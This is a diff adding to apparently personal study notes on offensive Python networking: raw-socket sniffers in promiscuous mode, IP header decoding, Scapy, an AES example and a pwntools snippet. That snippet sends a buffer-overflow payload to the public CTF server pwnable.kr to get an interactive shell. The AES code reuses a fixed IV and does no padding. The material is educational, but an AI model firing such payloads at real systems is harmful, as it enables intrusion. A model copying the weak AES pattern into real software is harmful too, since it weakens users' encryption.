@@ -192,10 +192,10 @@ This is can be used to open a session.
 
 * Why UDP? Simple and no overhead. 
 * Windows requires some extra flags through a Socket Input/Output Control (IOCTL). 
-This enables network [Promiscuous mode](https://en.wikipedia.org/wiki/Promiscuous_mode). 
-* _socket.IPPROTO_IP_: Windows allow us to sniff all incoming packets
+This enables network [Promiscuous mode](https://en.wikipedia.org/wiki/Promiscuous_mode) - that we receive all packets. 
+* _socket.IPPROTO_IP_: Windows allow us to sniff all incoming packets.
 * _socket.IPPROTO_ICMP_: Linux forces us to specify ICMP. 
-* _socket.SOCK_RAW_: In the sniffer, we create a raw socket 
+* _socket.SOCK_RAW_: In the sniffer, we create a raw socket. 
 * _raw_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)_: set parameters to include IP headers. 
 * [netaddr](https://pypi.org/project/netaddr/) - to cover subnets. 
 
@@ -203,15 +203,25 @@ This enables network [Promiscuous mode](https://en.wikipedia.org/wiki/Promiscuou
 * Goal: decode from binary to human-readable.
 * [ctypes](https://docs.python.org/3/library/ctypes.html) - we're using this module to create a C-like structure to map 
 the first 20 bytes into a readable IP header. We can also use this module to create a C-like structure to decode ICMP responses.
-* [struct](https://docs.python.org/3/library/struct.html) - this module performs conversions between Python values and C structs represented as Python bytes objects.
+For instance, the version field in our IP header: _("version", c_ubyte, 4)_ - c_ubyte means that it is an unsigned char in 
+C, but a int/long in Python. 
+* [struct](https://docs.python.org/3/library/struct.html) - this module performs conversions between Python values and 
+C structs represented as Python bytes objects. In our discovery tool, we use it to pack the src and dst address, which are
+the type native unsigned int (@ for native, I for unsigned int).  
+<pre>
+>>> socket.inet_ntoa(struct.pack("@I", 1111111))
+'71.244.16.0'
+</pre>
 
 <a name="chap4"></a>
 ## Chapter 4: Owning the network with Scapy
 > After the book was published, Scapy got more functionality - some of the functions in the book are now doing stuff
 that Scapy already can. 
 
-[Scapy](https://scapy.readthedocs.io/en/latest/) - Scapy is a Python program that enables the user to send, 
-sniff and dissect and forge network packets. This capability allows construction of tools that can probe, scan or attack networks.
+[Scapy](https://scapy.readthedocs.io/en/latest/) - Scapy is a powerful packet manipulation tool. 
+It is a Python program that enables the user to send, sniff and dissect and forge network packets. 
+This capability allows construction of tools that can probe, scan or attack networks. It can be used to build tools
+replacing parts of (or fully) wireshark/tshark, nmap, tcpdump or arpspoof.  
 
 Install: 
 <pre> $ pip install scapy
@@ -732,6 +742,26 @@ Nice summary from the [API docs](https://pycryptodome.readthedocs.io/en/latest/s
 
 ![Alt text](figures/Crypto.png?raw=true)
 
+#### Encrypting and decrypting with AES
+<pre>
+from Crypto.Random import get_random_bytes
+from Crypto.Cipher import AES
+
+IV = get_random_bytes(16)
+key = get_random_bytes(16)
+
+def encrypt(text):
+    AES_cipher = AES.new(key, AES.MODE_CBC, IV)
+    ciphertext = AES_cipher.encrypt(text)
+    return ciphertext
+
+def decrypt(ciphertext):
+    AES_cipher = AES.new(key, AES.MODE_CBC, IV)
+    plaintext = AES_cipher.decrypt(ciphertext)
+    return plaintext
+</pre>
+
+
 <a name="misc"></a>
 ## MISC
 ** Other questions we might get ** 
@@ -778,6 +808,28 @@ for i in range(10):
 </pre>
 
 Another way of speeding up Python is to use Nutika. Nutika compiles Python to C/C++. 
+
+#### Pwntools
+"pwn" means to compromise or control another computer, web site, gateway device, or application. 
+It is synonymous with one of the definitions of hacking or cracking. 
+
+Python has a helpful library for this purpose, named pwntools. It is a framework made for CTFs. 
+
+Example of usage of pwntools:
+<pre>
+from pwn import *  
+
+host = "pwnable.kr"
+port = 9000
+payload = "AAAA" * 13 + p32(0xcafebabe)
+
+target = remote(host, port)  
+target.sendline(payload) 
+target.interactive()
+</pre>
+* p32() - converts 4-bytes (32-bits) integer in a little endian format. 
+* sendline(payload) - send the payload ending with a new line.
+* target.interactive() - start interacting with the target (e.g. send shell commands).
 
 <a name="modules"></a>
 ## Summary of all Python modules/packages you should know 
